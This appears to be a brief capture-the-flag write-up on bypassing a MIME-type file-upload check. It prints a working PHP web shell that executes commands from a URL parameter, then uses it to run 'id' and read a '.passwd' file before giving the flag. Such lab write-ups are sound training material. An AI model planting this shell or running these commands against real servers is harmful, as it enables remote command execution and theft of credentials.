



What is MIME type ?




![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203429.png)


I can then to do this :

```
\\Example
image?c=id
```

The Payload :

```
<?php
if(isset($_GET['c'])) {
    echo "<pre>"; 
    system($_GET['c']);
    echo "</pre>";
}
?>
```


![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203756.png)

Then open in a new tab the malicious php code then put in it Burp Repeater like this :

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203734.png)


Now that we know that it is working let's find the flag

```
cat ../../../.passwd
```

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203353.png)





Flag : a7n4nizpgQgnPERy89uanf6T4